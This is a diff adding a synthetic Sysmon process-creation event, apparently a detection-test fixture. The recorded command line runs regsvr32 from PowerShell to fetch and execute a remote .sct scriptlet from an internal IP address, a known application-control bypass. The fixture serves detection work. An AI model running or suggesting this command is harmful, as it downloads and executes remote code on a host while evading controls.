@@ -1,0 +1,52 @@
+{
+  "Event": {
+    "EventData": {
+      "CommandLine": "\"C:\\Windows\\system32\\regsvr32.exe\"  /s /n /u /i:http://192.168.57.2:8080/TGnALEigHGs8.sct scrobj.dll",
+      "Company": "Microsoft Corporation",
+      "CurrentDirectory": "C:\\Users\\Gen Eric\\",
+      "Description": "Microsoft(C) Register Server",
+      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
+      "Hashes": "SHA1=645C424974FBE5FE7A04CAC73F1C23C96E1570B8,MD5=59BCE9F07985F8A4204F4D6554CFF708,SHA256=CA24AEF558647274D019DFB4D7FD1506D84EC278795C30BA53B81BB36130DC57,IMPHASH=84DA4A3165E248148F65DBE03B98A436",
+      "Image": "C:\\Windows\\System32\\regsvr32.exe",
+      "IntegrityLevel": "Medium",
+      "LogonGuid": "49F1AF32-DB3E-5A72-0000-00204F830100",
+      "LogonId": "0x0001834f",
+      "ParentCommandLine": "\"C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ParentProcessGuid": "49F1AF32-DF5F-5A7A-0000-001028367201",
+      "ParentProcessId": "1352",
+      "ProcessGuid": "49F1AF32-DF73-5A7A-0000-0010D2E97201",
+      "ProcessId": "1444",
+      "Product": "Microsoft� Windows� Operating System",
+      "TerminalSessionId": "1",
+      "User": "GenEric-PC\\Gen Eric",
+      "UtcTime": "4242-04-24 13:37:42.422"
+    },
+    "System": {
+      "Channel": "Microsoft-Windows-Sysmon/Operational",
+      "Computer": "BLAHBLAH",
+      "Correlation": {},
+      "EventID": "1",
+      "EventRecordID": "5074393",
+      "Execution": {
+        "ProcessID": "1312",
+        "ThreadID": "1884"
+      },
+      "Keywords": "0x8000000000000000",
+      "Level": "4",
+      "Opcode": "0",
+      "Provider": {
+        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
+        "Name": "Microsoft-Windows-Sysmon"
+      },
+      "Security": {
+        "UserID": "S-1-5-18"
+      },
+      "Task": "1",
+      "TimeCreated": {
+        "SystemTime": "4242-04-24 13:37:42.422"
+      },
+      "Version": "5"
+    }
+  }
+}
